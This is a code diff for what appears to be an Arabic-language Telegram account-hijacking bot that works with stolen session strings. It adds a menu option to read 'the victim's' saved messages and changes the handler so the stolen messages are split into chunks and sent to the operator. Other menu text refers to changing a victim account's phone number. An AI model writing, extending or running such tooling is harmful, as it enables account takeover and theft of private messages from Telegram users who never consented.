@@ -191,6 +191,7 @@ menu = '''
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
+"V" ~ [معرفة رسائل المحفوظه للضحيه]
 '''
 mm = '''
 قم بلأنضمام الى قناة الساحر @SXYO3
@@ -744,4 +745,12 @@ async def users(event):
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
         
         saved_messages = await savedmsgs(strses.text)
-        await event.reply(saved_messages + "\n\nشكرا لأستخدامك سورس الساحر", buttons=keyboard)
+
+        
+        message_parts = [saved_messages[i:i + 4096] for i in range(0, len(saved_messages), 4096)]
+
+        
+        for part in message_parts:
+            await event.respond(part)
+
+        await event.respond("شكرا لأستخدامك سورس الساحر", buttons=keyboard)
